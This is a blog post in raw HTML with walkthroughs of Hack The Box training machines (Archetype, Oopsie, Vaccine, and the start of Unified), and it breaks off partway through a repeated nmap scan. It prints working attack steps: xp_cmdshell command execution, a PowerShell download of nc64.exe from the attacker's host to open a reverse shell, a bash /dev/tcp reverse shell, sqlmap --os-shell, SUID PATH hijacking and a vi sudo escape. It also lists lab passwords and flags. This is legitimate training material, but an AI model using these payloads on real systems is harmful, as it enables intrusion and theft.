<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self'; form-action 'self'; frame-src 'self'; img-src 'self' data: https://*.google-analytics.com https://*.googletagmanager.com; object-src 'none'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' https://*.googletagmanager.com; prefetch-src 'self'; connect-src 'self' https://*.google-analytics.com https://*.analytics.google.com https://*.googletagmanager.com"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB Writeup: Learn the basics of Penetration Testing – Tier 2 | woadey</title>
<meta name=keywords content="hackthebox,htb,archetype,oopsie,vaccine,unified,writeup"><meta name=description content="Short writeups for each of the Starting Point boxes on HTB – Tier 2"><meta name=author content><link rel=canonical href=https://woadey.xyz/posts/htb/startingpoint-tier2/><link crossorigin=anonymous href=/assets/css/stylesheet.1e29e54d58ab90b3a17e16bb686f83913075cda65bf7dd9d85dd20d1a57e1f46.css integrity="sha256-HinlTVirkLOhfha7aG+DkTB1zaZb992dhd0g0aV+H0Y=" rel="preload stylesheet" as=style><link rel=icon href=https://woadey.xyz/favicon/pink_trans_bg/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://woadey.xyz/favicon/pink_trans_bg/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://woadey.xyz/favicon/pink_trans_bg/favicon-32x32.png><link rel=apple-touch-icon href=https://woadey.xyz/favicon/white_pink_bg/apple-touch-icon.png><link rel=mask-icon href=https://woadey.xyz/favicon/pink_trans_bg/favicon.ico><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://woadey.xyz/posts/htb/startingpoint-tier2/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9703667233476494" crossorigin=anonymous></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-EF924K1NXR"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-EF924K1NXR")}</script><meta property="og:title" content="HTB Writeup: Learn the basics of Penetration Testing – Tier 2"><meta property="og:description" content="Short writeups for each of the Starting Point boxes on HTB – Tier 2"><meta property="og:type" content="article"><meta property="og:url" content="https://woadey.xyz/posts/htb/startingpoint-tier2/"><meta property="og:image" content="https://woadey.xyz/covers/startingpoint.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-11-02T11:30:33-07:00"><meta property="article:modified_time" content="2022-11-02T11:30:33-07:00"><meta property="og:site_name" content="woadey's blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://woadey.xyz/covers/startingpoint.png"><meta name=twitter:title content="HTB Writeup: Learn the basics of Penetration Testing – Tier 2"><meta name=twitter:description content="Short writeups for each of the Starting Point boxes on HTB – Tier 2"><meta name=twitter:site content="@woadey_"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"posts","item":"https://woadey.xyz/posts/"},{"@type":"ListItem","position":2,"name":"HTB Writeup: Learn the basics of Penetration Testing – Tier 2","item":"https://woadey.xyz/posts/htb/startingpoint-tier2/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB Writeup: Learn the basics of Penetration Testing – Tier 2","name":"HTB Writeup: Learn the basics of Penetration Testing – Tier 2","description":"Short writeups for each of the Starting Point boxes on HTB – Tier 2","keywords":["hackthebox","htb","archetype","oopsie","vaccine","unified","writeup"],"articleBody":"Archetype nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 # Nmap 7.92 scan initiated Wed Nov 2 14:28:03 2022 as: nmap -sC -sV -oA nmap/archetype 10.129.91.127 Nmap scan report for 10.129.91.127 Host is up (0.074s latency). Not shown: 996 closed tcp ports (reset) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM | ms-sql-ntlm-info: | Target_Name: ARCHETYPE | NetBIOS_Domain_Name: ARCHETYPE | NetBIOS_Computer_Name: ARCHETYPE | DNS_Domain_Name: Archetype | DNS_Computer_Name: Archetype |_ Product_Version: 10.0.17763 | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2022-11-02T18:27:24 |_Not valid after: 2052-11-02T18:27:24 |_ssl-date: 2022-11-02T18:28:25+00:00; -1s from scanner time. Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2022-11-02T18:28:14 |_ start_date: N/A | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb-os-discovery: | OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3) | Computer name: Archetype | NetBIOS computer name: ARCHETYPE\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2022-11-02T11:28:15-07:00 | ms-sql-info: | 10.129.91.127:1433: | Version: | name: Microsoft SQL Server 2017 RTM | number: 14.00.1000.00 | Product: Microsoft SQL Server 2017 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 |_clock-skew: mean: 1h23m59s, deviation: 3h07m51s, median: -1s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Nov 2 14:28:26 2022 -- 1 IP address (1 host up) scanned in 22.75 seconds smb smb is open so:\nsmbclient -N -L 10.129.91.127 command tags:\n-N | --no-pass: suppresses the normal password prompt from the client to the user. -L | --list: list available services on the server We can connect to the backups service without a password via:\nsmbclient \\\\\\\\10.129.91.127\\\\backups The only file housed here is prod.dtsConfig.\nfile: prod.dtsConfig\n1 2 3 4 5 6 7 8 Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False; Notably, this file leaks us\nPassword=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc; sql Attempting to connect to sql database using mysql:\nmysql -h 10.129.91.127 --port=1433 -u sql_svc -pM3g4c0rp123 After trying a couple variations of this, I realized that another tool maybe needed to connect to the db. This link mentioned mssqlclient.py. I ran locate mssqlclient.py to search kali for the script.\nConnect via:\npython3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth ARCHETYPE/sql_svc@10.129.91.127 Then I used the previous link as well as this cheatsheet for sql commands. Generating command execution seems good:\nEXEC xp_cmdshell 'net user'; – privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default: EXEC sp_configure 'show advanced options', 1; – priv RECONFIGURE; – priv EXEC sp_configure 'xp_cmdshell', 1; – priv RECONFIGURE; – priv And we have command execution: Then I tried several one-liner reverse shells for powershell, but didn’t have any luck. So, I reverted back to the netcat binary (nc64.exe) to spin up a reverse shell.\nTo host this file to the box:\npython3 -m http.server Additionally, start nc locally for the reverse shell:\nnc -lvnp 1337 Download the binary and run:\nxp_cmdshell \"powershell.exe cd c:\\Users\\Public; wget http://10.10.14.232:8000/nc64.exe -outfile nc64.exe; .\\nc64.exe -e cmd.exe 10.10.14.232 1337\" After a bit of poking around, I found this:\nDirectory: C:\\Users\\sql_svc\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 2/25/2020 6:37 AM 32 user.txt file: user.txt:\n1 3e7b102e78218e935bf3f4951fec21a3 privesc Now we can look into becoming root. One great tool for automating this process is winPEAS. Just download it locally and then host it on a python server and download it in the reverse shell!\nAs I was scrolling through the output, a few things stood out:\n͹ Enumerating Security Packages Credentials Version:NetNTLMv2 Hash: sql_svc::ARCHETYPE:1122334455667788:947576aa2fadb0cbbee6e345caee3fc6:0101000000000000ec105ee002efd8013a4c4936e65e1a2e0000000008003000300000000000000000000000003000004961ea35a68c9880c3eabe5d1edabb04866d05ca16c6fe9706906f3be985311d0a00100000000000000000000000000000000000090000000000000000000000 I decided to check the console history first:\ntype C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadline/ConsoleHost_history.txt file: ConsoleHost_history.txt\n1 2 net.exe use T: \\\\Archetype\\backups /user:administrator MEGACORP_4dm1n!! exit Now we can revert back to impacket tools and use psexec.py:\npython3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:MEGACORP_4dm1n\\!\\!@10.129.91.127 Finally, print out the flag.\ntype C:\\Users\\Administrator\\Desktop\\root.txt Questions Which TCP port is hosting a database server? 1433 What is the name of the non-Administrative share available over SMB? backups What is the password identified in the file on the SMB share? M3g4c0rp123 What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server? mssqlclient.py What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell? xp_cmdshell What script can be used in order to search possible paths to escalate privileges on Windows hosts? winPEAS What file contains the administrator’s password? ConsoleHost_history.txt user flag:3e7b102e78218e935bf3f4951fec21a3\nroot flag:b91ccec3305e98240082d4474b848528\nOopsie nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.92 scan initiated Thu Nov 3 01:03:34 2022 as: nmap -sC -sV -oA nmap/oopsie -T4 10.129.28.128 Nmap scan report for 10.129.28.128 Host is up (0.071s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA) | 256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA) |_ 256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Welcome |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Nov 3 01:03:44 2022 -- 1 IP address (1 host up) scanned in 10.62 seconds http Start with http. Off the bat, I noticed that megacorp.com is likely their domain since admin@megacorp.com is a listed email. Other than that, the landing page seemed useless.\nTime for gobuster:\nsudo gobuster dir -u http://10.129.28.128 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster.out -z ... /images (Status: 301) [Size: 315] [--\u003e http://10.129.28.128/images/] /.html (Status: 403) [Size: 278] /.php (Status: 03) [Size: 278] /js (Status: 301) [Size: 311] [--\u003e http://10.129.28.128/js/] /themes (Status: 301) [Size: 315] [--\u003e http://10.129.28.128/themes/] /css (Status: 301) [Size: 312] [--\u003e http://10.129.28.128/css/] /.htm (Status: 403) [Size: 278] /uploads (Status: 301) [Size: 316] [--\u003e http://10.129.28.128/uploads/] /. (Status: 200) [Size: 10932] /fonts (Status: 301) [Size: 314] [--\u003e http://10.129.28.128/fonts/] /.htaccess (Status: 403) [Size: 278] /.phtml (Status: 403) [Size: 278] /.htc (Status: 403) [Size: 278] /.html_var_DE (Status: 403) [Size: 278] /server-status (Status: 403) [Size: 278] /.htpasswd (Status: 403) [Size: 278] /.html. (Status: 403) [Size: 278] /.html.html (Status: 403) [Size: 278] /.htpasswds (Status: 403) [Size: 278] /.htm. (Status: 403) [Size: 278] /.htmll (Status: 403) [Size: 278] /.phps (Status: 403) [Size: 278] /.html.old (Status: 403) [Size: 278] /.ht (Status: 403) [Size: 278] /.html.bak (Status: 403) [Size: 278] /.htm.htm (Status: 403) [Size: 278] /.htgroup (Status: 403) [Size: 278] /.hta (Status: 403) [Size: 278] /.html1 (Status: 403) [Size: 278] /.html.LCK (Status: 403) [Size: 278] /.html.printable (Status: 403) [Size: 278] /.htm.LCK (Status: 403) [Size: 278] /.htaccess.bak (Status: 403) [Size: 278] /.html.php (Status: 403) [Size: 278] /.htx (Status: 403) [Size: 278] /.htmls (Status: 403) [Size: 278] /cdn-cgi (Status: 301) [Size: 316] [--\u003e http://10.129.28.128/cdn-cgi/] /.htlm (Status: 403) [Size: 278] /.htm2 (Status: 403) [Size: 278] /.html- (Status: 403) [Size: 278] /.htuser (Status: 403) [Size: 278] /cdn-cgi seemed strange and stood out. After a quick search, we find this relates to Cloudflare. Maybe there is a login page?\nhttp://10.129.28.128/cdn-cgi/login/ works!\nI tried some basic usernames and passwords, but no luck. Let’s just login as a guest for now:\nLooks like the website is using php. Also, if we change the id in the url, we are able to change the Account, Branding, and Clients tab output. My first thought was to check the cookies to see if we can’t edit something.\nCombining these ideas of the cookies and the id, I quickly unlocked the Uploads tab. I guess upload a php reverse shell.\nNow to find where this file was uploaded, and how to run it. /uploads seems like a plausible place to look (we saw this from our first scan).\nFlag is found in /home/robert/user.txt\nfile: user.txt\n1 f2c74ee8db7983851ab2a96a44eb7981 python3 -c 'import pty;pty.spawn(\"/bin/bash\")' The above command gives us a functional shell\nexport TERM=xterm The above command lets us clear the screen.\nAfter a bit of looking around, I found the www directories and went searching through that (/var/www/html/cdn-cgi/login). This lead to:\nindex.php:if($_POST[\"username\"]===\"admin\" \u0026\u0026 $_POST[\"password\"]===\"MEGACORP_4dm1n!!\") index.php: file: db.php\n1 2 3 \u003c?php $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage'); ?\u003e We can now go from www-data to robert via su robert and put in his password M3g4C0rpUs3r!\nprivesc Time for linpeas. I simply downloaded the .sh file locally, hosted it on a python server, and then downloaded it on the reverse shell.\nOn the first look through, the bugtracker group stood out – especially since there is an unknown SUID (Set owner User ID) binary called /usr/bin/bugtracker.\nltrace is a tool that allows you to run a binary and see the libraries that are being called. This will help give us a better idea of what is going on under the hood.\nltrace /usr/bin/bugtracker The above command gives us the output:\nSince system(\"cat...\") is being run, we can simply update the $path environment variable to point to point to our own malicious cat such as a /bin/sh shell that will keep the admin privileges. Like so:\nQuestions With what kind of tool can intercept web traffic? proxy What is the path to the directory on the webserver that returns a login page? /cdn-cgi/login What can be modified in Firefox to get access to the upload page? cookie What is the access ID of the admin user? 34322 On uploading a file, what directory does that file appear in on the server? /uploads What is the file that contains the password that is shared with the robert user? db.php What executable is run with the option “-group bugtracker” to identify all files owned by the bugtracker group? find Regardless of which user starts running the bugtracker executable, what’s user privileges will use to run? root What SUID stands for? Set owner user id What is the name of the executable being called in an insecure manner? cat user flag: f2c74ee8db7983851ab2a96a44eb7981\nroot flag: af13b0bee69f8a877c3faf667f7beacf\nVaccine nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 # Nmap 7.92 scan initiated Thu Nov 3 18:03:58 2022 as: nmap -sC -sV -oA nmap/vaccine -T4 10.129.199.211 Nmap scan report for 10.129.199.211 Host is up (0.070s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.14.66 | Logged in as ftpuser | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rwxr-xr-x 1 0 0 2533 Apr 13 2021 backup.zip 22/tcp open ssh OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA) | 256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA) |_ 256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: MegaCorp Login | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Nov 3 18:04:09 2022 -- 1 IP address (1 host up) scanned in 10.79 seconds ftp ftp is open on port 21 and anonymous mode is enabled. Found a file named backup.zip, however the files are password protected on unzipping. john has a tool called zip2john that can allow us to convert his file to hash, and ultimately try to crack it.\nzip2john backup.zip \u003e zip.hash john -w=/usr/share/wordlists/rockyou.txt zip.hash ... backup.zip:741852963::backup.zip:style.css, index.php:backup.zip 1 password hash cracked, 0 left 741852963 turns out to be the password for the zip!\nTaking a look into index.php gives us some password information:\nhash_md5(???) = \"2cb42f8734ea607eefed3b70af13bbd3\" md5lookup tells us the password is qwerty789\nhttp http is also open, so it is likely they have a website.\nNow lets try the credentials we found admin:qwerty789\nAfter looking around, the only thing that seemed potentially vulnerable on the webpage was the search feature. This could be injectable via sqlmap. I first threw the website into burpsuite, copied the GET request of the search, and then saved this to a file called get.request.\nsqlmap -r get.request -p search From here, I started looking around the databases.\nsqlmap -r get.request -p search --search -C 'password' There could be valuable columns in pg_catalog, but I noticed a command flag called --os-shell in sqlmap’s man pages. After running this I actually got a shell (even better)!\nTime for a reverse shell – I just found these payloads for bash.\nbash -c \"bash -i \u003e\u0026 /dev/tcp/10.10.14.66/1337 0\u003e\u00261\" I then used pwncat to help keep a stable shell and listen on port 1337.\nfind / -name user.txt 2\u003e/dev/null file: user.txt\n1 ec9b13ca4d6229cd5cc1e09980965bf7 ssh When starting privesc, I found something valuable for ssh (Secure Shell).\ncd /; grep -R password Looks like we can now ssh into the server directly instead of hosting an unstable reverse shell.\nssh postgres@10.129.199.211` (P@s5w0rd!) privesc We can then try to escalate privs. Let’s start with the basics like id and sudo -l\nLooks like we can edit pg_hba.conf with sudo privs by using vi. So I tried the basic payload to get a shell.\nsudo /bin/vi /etc/postgresql/11/main/pg_hba.conf (in vi) :set shell=/bin/sh` :shell Questions Besides SSH and HTTP, what other service is hosted on this box? ftp This service can be configured to allow login with any password for specific username. What is that username? anonymous What is the name of the file downloaded over this service? backup.zip What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts? zip2john What is the password for the admin user on the website? qwerty789 What option can be passed to sqlmap to try to get command execution via the sql injection? --os-shell What program can the postgres user run as root using sudo? vi user flag: ec9b13ca4d6229cd5cc1e09980965bf7\nroot flag: dd6e058e814260bc70e9bbdef2715849\nUnified nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 # Nmap 7.92 scan initiated Fri Nov 4 22:29:03 2022 as: nmap -sC -sV -oA nmap/unified -T4 10.129.186.136 Nmap scan report for 10.129.186.136 Host is up (0.073s latency). Not shown: 996 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:Cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 6789/tcp open ibm-db2-admin? 8080/tcp open http-proxy | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 431 | Date: Sat, 05 Nov 2022 02:29:11 GMT | Connection: close | \u003c!doctype html\u003e","wordCount":"3209","inLanguage":"en","image":"https://woadey.xyz/covers/startingpoint.png","datePublished":"2022-11-02T11:30:33-07:00","dateModified":"2022-11-02T11:30:33-07:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://woadey.xyz/posts/htb/startingpoint-tier2/"},"publisher":{"@type":"Organization","name":"woadey","logo":{"@type":"ImageObject","url":"https://woadey.xyz/favicon/pink_trans_bg/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://woadey.xyz/ accesskey=h title="oadey (Alt + H)"><img src=/images/pink.jpeg srcset="/images/pink_hu17913946300421030964.webp 32w, /images/pink_hu18268070055743548763.webp 120w" sizes=32px height=32 width=32 alt=logo aria-label=logo>
oadey</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://woadey.xyz/posts/ title=posts><span>posts</span></a></li><li><a href=https://woadey.xyz/categories/ title=categories><span>categories</span></a></li><li><a href=https://woadey.xyz/tags/ title=tags><span>tags</span></a></li><li><a href=https://woadey.xyz/archives/ title=archives><span>archives</span></a></li><li><a href=https://woadey.xyz/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://woadey.xyz/>home</a>&nbsp;»&nbsp;<a href=https://woadey.xyz/posts/>posts</a></div><h1 class="post-title entry-hint-parent">HTB Writeup: Learn the basics of Penetration Testing – Tier 2</h1><div class=post-description>Short writeups for each of the Starting Point boxes on HTB – Tier 2</div><div class=post-meta><span title='2022-11-02 11:30:33 -0700 -0700'>November 2, 2022</span>&nbsp;·&nbsp;16 min</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#archetype>Archetype</a><ul><li><a href=#nmap>nmap</a></li><li><a href=#smb>smb</a></li><li><a href=#sql>sql</a></li><li><a href=#privesc>privesc</a></li><li><a href=#questions>Questions</a></li></ul></li><li><a href=#oopsie>Oopsie</a><ul><li><a href=#nmap-1>nmap</a></li><li><a href=#http>http</a></li><li><a href=#privesc-1>privesc</a></li><li><a href=#questions-1>Questions</a></li></ul></li><li><a href=#vaccine>Vaccine</a><ul><li><a href=#nmap-2>nmap</a></li><li><a href=#ftp>ftp</a></li><li><a href=#http-1>http</a></li><li><a href=#ssh>ssh</a></li><li><a href=#privesc-2>privesc</a></li><li><a href=#questions-2>Questions</a></li></ul></li><li><a href=#unified>Unified</a><ul><li><a href=#nmap-3>nmap</a></li><li><a href=#http-2>http</a></li><li><a href=#privesc-3>privesc</a></li><li><a href=#questions-3>Questions</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=archetype>Archetype<a hidden class=anchor aria-hidden=true href=#archetype>#</a></h2><h3 id=nmap>nmap<a hidden class=anchor aria-hidden=true href=#nmap>#</a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=c1># Nmap 7.92 scan initiated Wed Nov  2 14:28:03 2022 as: nmap -sC -sV -oA nmap/archetype 10.129.91.127</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.91.127
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.074s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>996</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE      VERSION
</span></span><span class=line><span class=cl>135/tcp  open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>445/tcp  open  microsoft-ds Windows Server <span class=m>2019</span> Standard <span class=m>17763</span> microsoft-ds
</span></span><span class=line><span class=cl>1433/tcp open  ms-sql-s     Microsoft SQL Server <span class=m>2017</span> 14.00.1000.00<span class=p>;</span> RTM
</span></span><span class=line><span class=cl><span class=p>|</span> ms-sql-ntlm-info: 
</span></span><span class=line><span class=cl><span class=p>|</span>   Target_Name: ARCHETYPE
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Domain_Name: ARCHETYPE
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Computer_Name: ARCHETYPE
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Domain_Name: Archetype
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Computer_Name: Archetype
</span></span><span class=line><span class=cl><span class=p>|</span>_  Product_Version: 10.0.17763
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>SSL_Self_Signed_Fallback
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2022-11-02T18:27:24
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2052-11-02T18:27:24
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2022-11-02T18:28:25+00:00<span class=p>;</span> -1s from scanner time.
</span></span><span class=line><span class=cl>Service Info: OSs: Windows, Windows Server <span class=m>2008</span> R2 - 2012<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2022-11-02T18:28:14
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: N/A
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   3.1.1: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled but not required
</span></span><span class=line><span class=cl><span class=p>|</span> smb-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   account_used: guest
</span></span><span class=line><span class=cl><span class=p>|</span>   authentication_level: user
</span></span><span class=line><span class=cl><span class=p>|</span>   challenge_response: supported
</span></span><span class=line><span class=cl><span class=p>|</span>_  message_signing: disabled <span class=o>(</span>dangerous, but default<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> smb-os-discovery: 
</span></span><span class=line><span class=cl><span class=p>|</span>   OS: Windows Server <span class=m>2019</span> Standard <span class=m>17763</span> <span class=o>(</span>Windows Server <span class=m>2019</span> Standard 6.3<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Computer name: Archetype
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS computer name: ARCHETYPE<span class=se>\x</span><span class=m>00</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Workgroup: WORKGROUP<span class=se>\x</span><span class=m>00</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  System time: 2022-11-02T11:28:15-07:00
</span></span><span class=line><span class=cl><span class=p>|</span> ms-sql-info: 
</span></span><span class=line><span class=cl><span class=p>|</span>   10.129.91.127:1433: 
